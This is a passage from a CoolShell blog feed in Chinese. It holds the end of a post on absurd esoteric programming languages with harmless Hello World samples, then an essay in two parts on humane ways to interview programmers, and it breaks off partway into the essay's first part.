Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook. Ook. Ook? Ook. Ook? Ook. Ook. Ook! Ook.</pre>
<p>下面是一些转换器和解释器：</p>
<ul>
<li>
<a href="http://www.dangermouse.net/esoteric/Ook.java">Java Ook!-to-BrainF*** 和 BrainF***-to-Ook! 转换器</a>.</li>
<li>
<a href="https://www.ruby-lang.org/en/raa-list.rhtml?name=RubyOok">Ook! Ruby解释器</a>.</li>
<li>
<a href="http://www.orakel.ntnu.no/~oyving/code/python/pook.py">Ook! Python解释器</a>.</li>
<li><a href="http://bluesorcerer.net/esoteric/ook.html">Ook!  .Net 编译器叫Ook#</a></li>
<li>
<a href="http://search.cpan.org/search?module=Acme::Ook">Ook! perl 解释器</a>.</li>
</ul>
<h4>
<span class="ez-toc-section" id="TMMLPTEALPAITAFNFAL"></span><strong>TMMLPTEALPAITAFNFAL</strong><span class="ez-toc-section-end"></span>
</h4>
<p>你没看错，上面这一排毫无意义的字母是一个语言的名称。它是The Multi-Million Language Project To End All Language Projects And Isn’t That A Fine Name For A Language的缩写。<a href="http://p-nand-q.com/humor/programming_languages/tmmlpteal.html" target="_blank">TMMLPTEALPAITAFNFAL语言</a>没有固定的语法规则，每一天都是不同的语法。例如，2000年10月13日你可以使用DIV但不能使用MOD；到了10月14日时你可以使用MOD了但DIV又不能用了。因此，你今天写的程序运行起来完全正常，但是到了明天就无法编译了。下面是一个TMMLPTEALPAITAFNFAL的Hello World程序，当然现在已经无法编译了。</p>
<pre style="padding-left: 30px;"><code>DECLARE CELL 100 AS READPOS
 DECLARE 10 AS NEWLINE
 WRITE CHAR NEWLINE
 COPY "Hello, World" TO CELL 0
 COPY 0 TO READPOS
 WHILE READPOS INDIRECT DO GOSUB 300
 WRITE CHAR NEWLINE
 RETURN
LINE 300: WRITE CHAR READPOS INDIRECT
 ADD 1 TO READPOS
 RETURN</code></pre>
<h4>
<span class="ez-toc-section" id="INTERCAL"></span>INTERCAL<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://catb.org/~esr/intercal/" target="_blank">INTERCAL语言</a>（<a href="https://en.wikipedia.org/wiki/INTERCAL" target="_blank">Wikipedia</a>）全称是“Compiler Language With No Pronounceable Acronym”。自认为是“超级黑客”的人可以试试用这个语言写程序。由老牌黑客<a href="https://en.wikipedia.org/wiki/Don_Woods">Don Woods</a> 和 <a href="https://en.wikipedia.org/wiki/James_M._Lyon">James M. Lyon</a> 在1972年发明，其是用来讽刺当时的那些编程语言。今天 这个语言有两个版本，一个是由牛人<a href="https://en.wikipedia.org/wiki/Eric_S._Raymond">Eric S. Raymond</a>维护的C-INTERCAL，另一个是Claudio Calvelli 维护的CLC-INTERCAL。（<strong>注</strong>：在自由软件启蒙阶段，<a href="https://en.wikipedia.org/wiki/Eric_S._Raymond">Eric S. Raymond</a>以如椽之笔呼啸而出，其核心著作被业界成为”五部曲”：《黑客道简史》（A Brief History of Hackerdom）、 《大教堂和市集》（The Cathedral and the Bazaar）、《如何成为一名黑客》（How To Become A Hacker）、《开拓智域》（Homesteading the Noosphere）、《魔法大锅炉》（The Magic Cauldron）。其中最著名的当然还是《大教堂和市集》，它在自由软件运动中的地位相当于基督教的《圣经》。而用黑客们的话说，这是”黑客藏经阁”的 第一个收藏。）</p>
<p>来看看其Hello World的程序：</p>
<pre style="padding-left: 30px;">DO ,1 &lt;- #13
PLEASE DO ,1 SUB #1 &lt;- #238
DO ,1 SUB #2 &lt;- #108
DO ,1 SUB #3 &lt;- #112
DO ,1 SUB #4 &lt;- #0
DO ,1 SUB #5 &lt;- #64
DO ,1 SUB #6 &lt;- #194
DO ,1 SUB #7 &lt;- #48
PLEASE DO ,1 SUB #8 &lt;- #22
DO ,1 SUB #9 &lt;- #248
DO ,1 SUB #10 &lt;- #168
DO ,1 SUB #11 &lt;- #24
DO ,1 SUB #12 &lt;- #16
DO ,1 SUB #13 &lt;- #162
PLEASE READ OUT ,1
PLEASE GIVE UP</pre>
<h4>
<span class="ez-toc-section" id="HQ9"></span>HQ9++<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.dangermouse.net/esoteric/hq9plusplus.html" target="_blank">HQ9++语言</a>同样是David Morgan-Mar 发明的，其带有四个指令的joke语言。</p>
<ul>
<li>
<strong>H</strong>: 输出 <a title="Hello,world!" href="https://www.esolangs.org/wiki/Hello%2C_world%21">“hello,world”</a>
</li>
<li>
<strong>Q</strong>: 输出程序员的源代码</li>
<li>
<strong>9</strong>: 打印 <a title="99 bottles of beer" href="https://www.esolangs.org/wiki/99_bottles_of_beer">“99 Bottles of Beer”</a> 的歌词</li>
<li>
<strong>+</strong>: 累加器</li>
</ul>
<h4>
<span class="ez-toc-section" id="PerlYuYan"></span><strong>PerlYuYan</strong><span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://zh.wikipedia.org/wiki/PerlYuYan" target="_blank">PerlYuYa</a>n语言是一个能令人使用中文文言文开发程式 Perl 程式的 Perl 模块，由<a href="https://zh.wikipedia.org/wiki/%E5%94%90%E9%B3%B3">唐凤</a>于2002年一月发表。它是<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%96%87%E7%B7%A8%E7%A8%8B%E8%AA%9E%E8%A8%80">中文编程语言</a>的尝试。作者利用中文的特质，将许多指令改成以一个中国汉字来表示，因而造成了文言语法的感觉。</p>
<p>看看下面的这段代码，相当的文言文啊。有兴趣可以<a href="http://search.cpan.org/~autrijus/Lingua-Sinica-PerlYuYan-0.03/" target="_blank">去CPAN上下载</a>回来玩玩。</p>
<pre style="padding-left: 30px;">#!/usr/local/bin/perl

use Lingua::Sinica::PerlYuYan;

用警兮用嚴。

印道
一至一
哉兮

印編曰雜申雜申矣
  又纖曰龍鼠矣
    又曰一矣

亂曰
國無人莫我知兮    又何懷乎故都
既莫足與為美政兮  吾將從彭咸之所居</pre>
<p>还有下面这个五言。</p>
<pre style="padding-left: 30px;"><code># The Sieve of Eratosthenes - 埃拉托斯芬篩法
use Lingua::Sinica::PerlYuYan;

  用籌兮用嚴。井涸兮無礙
。印曰最高矣  又道數然哉。
。截起吾純風  賦小入大合。
。習予吾陣地  並二至純風。
。當起段賦取  加陣地合始。
。陣地賦篩始  繫繫此雜段。
。終陣地兮印  正道次標哉。
。輸空接段點  列終註泰來。</code></pre>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83%EF%BC%9A"></span>参考：<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Category:Esoteric_programming_languages">Esoteric_programming_languages</a></li>
<li><a href="http://www.topdesignmag.com/top-13-most-absurd-programming-languages/" target="_blank">Top 13 Most Absurd Programming Languages</a></li>
<li><a href="http://wei.si/blog/2011/04/befunge-and-perlyuyan/" target="_blank">Befunge语言和文言文编程</a></li>
<li><a href="https://hi.baidu.com/namekin/blog/item/9f36f21fc6be296df724e452.html" target="_blank">疯狂的编程语言——ENGLISH，Chef，Shakespeare</a></li>
<li><a href="http://www.dangermouse.net/esoteric/" target="_blank">DM’s Esoteric Programming Languages</a></li>
<li><a title="Permanent Link to 十大另类程序语言（上）" rel="bookmark" href="http://www.matrix67.com/blog/archives/253">十大另类程序语言（上）</a></li>
<li><a title="Permanent Link to 十大另类程序语言（下）" rel="bookmark" href="http://www.matrix67.com/blog/archives/255">十大另类程序语言（下）</a></li>
</ul>
<p>看过这些，我我还有什么好说的呢，什么C/C++/Java，神马都是浮云了……</p>
<div><span style="font-family: Simsun; line-height: normal; font-size: medium;">(全文完) </span></div>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/2529.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_title">StackOverflow的404错误页</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1142.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1142.html" class="wp_rp_title">BT雷人的程序语言</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1202.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1202.html" class="wp_rp_title">面试题：赛马问题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3161.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3161.html" class="wp_rp_title">AES加密算法动画演示</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1174.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1174.html" class="wp_rp_title">程序员惯用的解释(Top 25)</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1103.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1103.html" class="wp_rp_title">漫画：程序员的一生</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4458" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="62887e4a98">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>28</strong> 人打了分，平均分： <strong>4.57</strong> )<br><span class="post-ratings-text" id="ratings_4458_text"></span><meta itemprop="name" content="BT雷人的程序语言（大全）">
<meta itemprop="headline" content="BT雷人的程序语言（大全）">
<meta itemprop="description" content="还记得以前本站的BT雷人的程序语言吗？除了那几个Brainfuck，LOLCODE和WhiteSpace，我以为这些是比较BT的语言，但是自从这两天我在网上看到一些（见文章最后的参考一节），我发现我错了，这个世界上，只有更变态，没有最变态。不相，你看看下面这些，简直变态到了极致啊。（下面的语言变态不分排名）
Befunge
第一个变态语言Befunge。维基上面说——这门语言由Chris Pr...">
<meta itemprop="datePublished" content="2011-04-13T08:34:50+08:00">
<meta itemprop="dateModified" content="2011-04-13T01:00:11+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4458.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4458.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.57">
<meta itemprop="ratingCount" content="28">
</div>
</div>
<div id="post-ratings-4458-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-13T08:34:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/4458.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 再谈“我是怎么招聘程序员的”（下） ]]></title>
<link>https://coolshell.cn/articles/4490.html</link>
<content><![CDATA[ 
<p><strong><a title="再谈“我是怎么招聘程序员的”（上）" href="https://coolshell.cn/articles/4506.html" target="_blank"><strong>&lt;&lt;&lt;再谈“我是怎么招聘程序员的”（上）</strong></a></strong></p>
<p>在上篇中，我们说到了一些认识人的方法（操作，知识，经验，能力），还有一些面试的方法（算法题，实际生产活动中的挑战），下面我们来说说，面试的风格，还有一些点评。<strong><strong><br>
</strong></strong></p>
<h4>把应聘者当成你的同事</h4>
<p>有些公司的面试官，在面试过程中问你一个算法题，然后等着你解答了，如果你给出一个答案，然后就会问你有没有更好的答案，如果你给出了正确的答案，他们就会问你一个更难的问题，如此循环下去。他们基本上很少给你提示，甚至不停地质问你，挑战你，搞得应聘者很紧张。</p>
<p>另外，有很多问题是没有标准答案的，或者说是，同一个答案的描述方法有多种，很多面试官会觉得你没有回答到他想要的答案，因此表现得有对你不屑，并表现出你不行的样子，并觉得你的能力有问题。真是可笑了。比如我一个朋友在回答什么是异步的问题时，举例说明了异步调用就是不能处理完就返回，并且需要传递一个回调函数给调用方以便完成后回调通知结果。这样的回答并没有错，但是这并不符合面试官心里想要的答案，面试官对此并不满意，进而认为我这个朋友还需要去多读读书。</p>
<p>我相信大多数面试官都会这样干的。我想问问这样的面试官，<strong>你们有没有用面试的方式对过你的同事？在你的工作场景中，你会不会用面试的风格和你的同事进行交流和说话？</strong>不妨让我们来问我们自己下面几个问题：</p>
<ul>
<li>你在工作当中遇到难题时你是怎么解决的？你会和人讨论吗？你只用15分钟就能得出最优解吗？</li>
<li>你在工作当中解决难题时是否会有一个人在旁边质问你并给你压力吗？</li>
<li>你在工作当中会为难你的同事吗？会让你的同事紧张吗？你觉得在紧张的状态下能做好工作吗？</li>
<li>你在工作中觉得同事的回答并不是你想要的答案，不是符合你的答案，你会认为你的同事不行吗？</li>
<li>你的成长过程是什么样的？在是压力和天天被人质问的情况下成长的吗？</li>
<li>大家都知道学校里应试教育的弊端，你觉得你的面试是不是一种应试呢？<br>
（看看这么多的应聘者们都在做各种各样的算法题，这不就是一种应试吗？）</li>
</ul>
<p>想一想你的日常工作，问自己一下上面这些问题，想一想你自己的成长过程，想一想你和你的同事是怎么相处的，想一想你的日常工作中是什么样的，相信你自己也能得出结论的。</p>
<p>如果你把应聘者当成自己未来的同事，那么你的面试会有下面的收获：</p>
<p><span id="more-4490"></span></p>
<ul>
<li>面试的气氛会很不错，应聘者会放松，表现自然，更接受于真实的状态。</li>
<li>面试中的交流和互动（而不是一问一答）会让你更全面的考查和了解一个人。</li>
<li>非应试的面试，会让你了解得更多。</li>
<li>真实的了解一个人，你才能做出真正正确的结论。</li>
</ul>
<h4>向应聘者学习</h4>
<p>下面有几个观点</p>
<ul>
<li>面试的过程是一个相互学习的过程，并不是你为难面试者的过程。</li>
<li>一问一答是很一种呆板死板的过程，相互讨论相互学习，有良好的互动才是好的面试过程。</li>
<li>面试官要证明的不是你有多强有多聪明，而是要挖掘应聘者的优势和能力。</li>
<li>面试官用为自己的问题预设好一个标准答案，看看应聘者能为你带来什么。</li>
<li>向来应聘的人学习，而不是刁难。</li>
</ul>
<p><strong>无论你多牛，要难倒你实在是太容易了。出难题不是目的，难倒人也很容易，出难题只不过是用来了解应聘者能力的一个手段，而不是面试的全部</strong>。</p>
<p>我不知道你喜欢不喜欢一些竞技类的运动？比如踢球，打篮球，羽毛球，下象棋等，你一般想和什么样的人玩？是差的，还是强的？所以，<strong>能够从面试者那里学到东西，喜欢和面试者一起工作，这才是面试真正的目的</strong>。</p>
<p>对于一个团队来说，如果大家都是一样的想法，一样的主张，一样的倾向，那么这个团队最终会是一个闭塞的团队，你如果不能真正接纳不同想法的人，不同主张的人，那么你也将失去进步的机会。<strong>如果你的团队总是在招入和你一样的人，那么你的团队怎么可能会有out-of-box的想法呢？世界因为不同而美好</strong>。</p>
<p>另外，对于公司来说，<strong>如果你招进来的人还不如已经有的人，作为一个公司，你又怎么能有更好的人让你的公司进步呢</strong>？</p>
<p>所以，面试应该是向面试者学习的一个过程。当然，<strong>如果你从他身上学不到什么，那么你就教他一些吧。这样，就算是面试不通过，面试者也会欣然接受的</strong>。不然，让面试者产生一些负面情绪，出去说一些不好的话，也有损你和公司的形象。</p>
<h4>一些相关的点评</h4>
<p>下面是我根据酷壳的一些<a href="https://coolshell.cn/tag/interview" target="_blank">面试题的文章</a>后的回复、还有我朋友的经历，还有这篇有关豆瓣的产品经理的<a title="知乎上某人写面试豆瓣产品经理的经历，很欢乐" href="https://www.douban.com/note/146145117/" target="_blank">这篇文章</a>的一些点评。大家可以看看我从这些地方看到东西靠不靠谱。</p>
<p><strong>酷壳的面试题中的答复</strong></p>
<p>先说酷壳的那篇“<a title="“火柴棍式”程序员面试题" href="https://coolshell.cn/articles/3961.html" target="_blank">火柴棍式的面试题</a>”，这个面试题其实很没什么意思。主要考查你对代码逻辑的了解程度。因为设置了回复可见答案，所以这篇文章的回复量达千把条。从回复中，我看到：</p>
<ul>
<li>一些朋友想不出来就直接看答案了。我可以看出，有一些朋友习惯获得知识，而不习惯独立思考。甚至有畏难情绪，从另一方面来说，可以看出我国的教育还真不是一般的差。</li>
<li>一些朋友想不全。从这点来看，我觉得很正常，尤其是想出两种来的，我可以感觉到他们的努力思考了，可能还做了一些尝试。挺不错的。可惜我看不到你思考的方式，是在纸上画了画，还是编译了个程序跑了跑，还是别的什么。这样我会了解你更多。</li>
<li>一些朋友给出的答案中有错的。这说明了这类朋友可能不喜欢做测试，时常想当然，或是做事比较冲动，并不足够严谨。这么简单的程序，验证能花多少精力呢？</li>
<li>还有少数的朋友没有看明白题目要求。这说明了这类朋友太粗心了，在工作当中可能会表现为误解需求和别人的话。沟通有问题。</li>
</ul>
<p>再说说那篇“<a title="面试题：火车运煤问题" href="https://coolshell.cn/articles/4429.html" target="_blank">火车运煤</a>”的问题，这个面试题我觉得主要是看看大家的解题思路，表达能力。</p>
<ul>
<li>首先，我很惊喜有人很快就用数学做了解答，很不错，这个人的数学功底很不错。能用数学解题的人一般来说都是算法比较强的人。</li>
<li>有人说抱怨我没有说火车可以调头回去，所以没有想到这样的方法。如果是在面试中我会做提示的。我不会因为你不知道调头这个潜规则而否定你的。当然，如果你能想到的话说明你的脑袋还是比较灵的。</li>
<li>还有很多人说他的方法比较土，只运了400吨煤，416吨的或333吨，一看就是没有看提示的，我觉得这些人能够通过独立思考找到方法，这类的人其实已经不错了。顺着这个思路优化也只是时间的问题了。</li>
<li>更可喜的是，我看到了有一些朋友在看到别人的更好的方法后和自己的方法进行了比较，并找到了为什么自己的方法不如他的原因。这样的人我认为是懂得“总结”和“比较”的，这样的人总是在不断地学习和改善自己的。</li>
<li>还有人说到了动态规划，如果是在面试的时候，我很想向这位朋友学习一下用动态规划来解这题。</li>
<li>还有朋友说到了火车调头只能在有站的地方。这个朋友一看要么就是搞需求分析的人，要么就是较真的人。需要进一步了解。但不管怎么样，这样的朋友的观察能力是很不错的。</li>
<li>还有一些朋友给出的答案是正确的。但是表达方面比较复杂，有些没有看懂。可见，解题 的能力是有的，只是表达能力还有待提高。</li>
</ul>
<p><strong>豆瓣产品经理的面试</strong></p>
<p>再说说豆瓣上的<a title="知乎上某人写面试豆瓣产品经理的经历，很欢乐" href="https://www.douban.com/note/146145117/" target="_blank">这篇文章</a>，那篇文章里，面试官问了一个比较大的问题，那是仁者见仁，智者见智的问题，并且面试官并不满意应聘者给出的答案，并在用其主观意识强加一些东西给应聘者，并不断地和应聘者纠缠。后来，面试官回复到“重点测了两个问题：一是判别事情的标准和方法；二是在多种PK下产品经理的压力反应”。</p>
<p>下面是我观察到的：</p>
<ul>
<li>其一、这种似事而非的仁者见仁，智者见仁，一万人有一万个答案。所以，这种怎么答都可以的问题是很难有标准的，我认为豆瓣的面试官以这种问题来考查面试者的标准太有问题了。更好的问题是：比较一下新浪和twitter这两个产品。</li>
<li>其二、多种想法PK的压力反应。这点没有问题，如果有机会我想问问这位面试官，豆瓣产品经理们的PK各自的想法时是以这种纠缠的方式吗？如果是这样的话，那我很为你们担忧啊。</li>
<li>其三、很明显，应聘者不知道面试官想说什么，所以应聘者总是给出一些模棱两可的回答。回答得很政客，呵呵。</li>
<li>其四、问的问题都是一些假设性的问题，假设技术人员不可沟通。人家说了，还没有见过不能沟通的情况。结果还要继续追问。这样你既要观察不到你想要的，也搞得大家不愉快。更好的问题的：“请你给一个你和一个很难沟通的人沟通的示例”，或是当应聘者说了“坚持己见”的时候，也应该追问“能给一个你坚持己见的例子吗？”。</li>
<li>其五、整个面试过程完全是在谈一些虚的东西，就像天上的浮云，一点实实在在的东西都没有。比如下面这两个实实在在的问题：“你以前设计过什么产品？”，“你和你的技术团队是怎么合作的？”</li>
</ul>
<p>这是一个完完全全失败的面试，这个面试官根本不懂面试，甚至工作方法也可能很有问题。也许他只是想找一个能够在工作中附和他的人。</p>
<p><strong>朋友的面试</strong></p>
<p>最后说说我那个朋友的面试，我的这个朋友学习能力很强，也很好专研，工作中解决了很多很困难甚至很底层的问题。他做软件开发时间并不长，但是他对这个行业很有热情，也很执着，并有着相当不错的技术功底。这天他遇到了一个面试官，根据朋友的描述，这位面试官，主要问题了三个问题，一个是关于异步的，一个是关于性能调优的，还有一个是关于学习能力的。</p>
<ul>
<li>问到异步的问题，我这个朋友说到了多线程中的异步调用，但是他可能问的是网络或是业务中的异步，要不然就是Linux 内核中的异步，当然他也没有说清楚，但他很不满意我朋友的答案，并让我朋友回去多看看书。</li>
<li>问到性能调优的问题时，我这个朋友说了性能调优分三级，业务级，指令级和CPU级，并举例说了使用了一个叫VTune的性能分析工具。面试官却说原来你只懂Windows，有点不屑，并说他只会使用商业工具，更不屑。</li>
<li>当我朋友向他澄清问题时，面试官只是摇头，叹气。并在应聘者作答的过程中不断的打断对方。</li>
</ul>
<p>我的看法如下：</p>
<ul>
<li>对于异步来说，我认为这是一种设计或是一种想法，可能会有很多种不同的实现方式，在不同的场景中会有不同的用法。面试官并没有考查应聘者对异步方法的理解，也没有考查异步方法可以用来解决什么，异步方法的优势和劣势，等等。只是觉得应聘者没有给出他想要的答案。</li>
<li>对于性调优的问题，我认为应聘者的思路和知识都很不错，还有使用VTune的经验。无论使用Windows还是Linux，无论使用商业的还是开源的Profiler，很多东西都是相通的，怎么能够因为这个东西不对自己的口味而下结论。为什么不向人家学习一下VTune呢？使用工具只是操作技能啊。</li>
<li>面试官应该是用微笑来鼓励应聘者的，而不是用摇头和叹气，频繁打断对方也是一个相当不好的习惯。看来这个面试官很不能接受不同的东西。</li>
</ul>
<p>这位有很不错的技术能力的人，看来并不适合做一个面试官，因为他面试的东西都只在知识层次，而且这位面试官有强烈的喜好和倾向，所以，他必然会错过那些有能力但并不合他口味的人。</p>
<p>哎，面对这样的面试官，大家伤不起啊！</p>
<p>（全文完）</p>
<p><span style="color: #ff0000;"><strong>（请勿用于商业用途，转载时请注明作者和出处）</strong></span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8138.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_title">为什么我反对纯算法面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4976.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4976.html" class="wp_rp_title">给程序员新手的一些建议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4506.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4506.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（上）</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3345.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3345.html" class="wp_rp_title">140个Google的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1870.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1870.html" class="wp_rp_title">我是怎么招聘程序员的</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4490" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="e77f5c4211">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>24</strong> 人打了分，平均分： <strong>4.46</strong> )<br><span class="post-ratings-text" id="ratings_4490_text"></span><meta itemprop="name" content="再谈“我是怎么招聘程序员的”（下）">
<meta itemprop="headline" content="再谈“我是怎么招聘程序员的”（下）">
<meta itemprop="description" content="&lt;&lt;&lt;再谈“我是怎么招聘程序员的”（上）

在上篇中，我们说到了一些认识人的方法（操作，知识，经验，能力），还有一些面试的方法（算法题，实际生产活动中的挑战），下面我们来说说，面试的风格，还有一些点评。

把应聘者当成你的同事
有些公司的面试官，在面试过程中问你一个算法题，然后等着你解答了，如果你给出一个答案，然后就会问你有没有更好的答案，如果你给出了正确的答案，他们就会问你一个更难的问...">
<meta itemprop="datePublished" content="2011-04-20T08:35:07+08:00">
<meta itemprop="dateModified" content="2012-12-20T09:38:03+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4490.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4490.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.46">
<meta itemprop="ratingCount" content="24">
</div>
</div>
<div id="post-ratings-4490-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-20T08:35:07+08:00</pubDate>
<guid>https://coolshell.cn/articles/4490.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 再谈“我是怎么招聘程序员的”（上） ]]></title>
<link>https://coolshell.cn/articles/4506.html</link>
<content><![CDATA[ 
<p>我以前写过一篇“<a title="我是怎么招聘程序员的" href="https://coolshell.cn/articles/1870.html" target="_blank">我是怎么招聘程序员的</a>”的文章（在<a title="我是怎么招聘程序员（CSDN）" href="http://blog.csdn.net/haoel/archive/2009/12/18/5032418.aspx" target="_blank">CSDN那里</a>有很多人进行了回复）。今天，我想再谈谈关于招聘和面试这方面的东西，主要是以下这些原因：</p>
<ul>
<li>近半年来我在进行了大量的招聘工作，对面试有一些新的体会。</li>
<li>酷壳最近发布了几篇趣味面试题（<a title="面试题：火车运煤问题" href="https://coolshell.cn/articles/4429.html" target="_blank">面试题一</a>，<a title="又一个有趣的面试题" href="https://coolshell.cn/articles/4162.html" target="_blank">面试题二</a>，<a title="“火柴棍式”程序员面试题" href="https://coolshell.cn/articles/3961.html" target="_blank">面试题三</a>），从回复中让我有一些思考。</li>
<li>我有一个同事最近面试了一家公司，他和我分享了一个博士专家对他的面试，也让我思考了一些。</li>
<li>在豆瓣上看到“<a title="知乎上某人写面试豆瓣产品经理的经历，很欢乐" href="https://www.douban.com/note/146145117/" target="_blank">知乎上某人写面试豆瓣产品经理的经历，很欢乐</a>”(亮点是面试官现身知乎亲自作答)</li>
</ul>
<p>所以，我很想把自己的这些新的想法再次写下来的。还是和以前一样，这篇文章同样是献给面试官的。我认为，面试的好坏完全在面试官而不是面试的人。下面是我对“<a title="我是怎么招聘程序员的" href="../articles/1870.html" target="_blank">我是怎么招聘程序员的</a>”一文中的一些加强性的观点。（关于一些点评，请参看<a href="https://coolshell.cn/articles/4490.html" target="_blank">本文下篇</a>）</p>
<p>为了让我的文章有连续性，请允许我重申一下前文的几个重要观点。</p>
<ul>
<li><strong>只有应聘者真实和自然的表现，才能了解到最真实的东西</strong></li>
<li><strong>重要的不是知识，重要的是其查找知识的能力</strong></li>
<li><strong>重要的不是那个解题的答案，而是解题的思路和方法</strong></li>
</ul>
<h4>操作，知识，经验，能力</h4>
<p>我们有很多的面试官似乎分不清，什么是操作能力，什么是知识，什么是经验，什么是能力，这导致了我们的面试官经常错误地对面试者下结论，我认为分不清这些事的人是没有资格做面试官的。所以，我有必要在这里把这个问题先讲清楚。</p>
<p><span id="more-4506"></span></p>
<p><img alt="image placeholder" ></p>
<ul>
<li>
<strong>操作</strong>。我们的面试官分不清楚什么是操作技能，什么是知识，他们甚至认为操作技能就是知识甚至经验。比如他们会 问如下的问题，请问Java中的 final是什么意思？怎么查看进程的CPU利用率？怎么编写一个管道程序？怎么查看进程的程序路径？VI中的拷贝粘贴命令是什么？包括面向对象的XX模 式是什么。等等。我以为，<strong>这些能够通过查况相关操作手册或是能够google到的东西只能说明这个人的操作技术，并不能说明他有知识或有经验</strong>。</li>
</ul>
<ul>
<li>
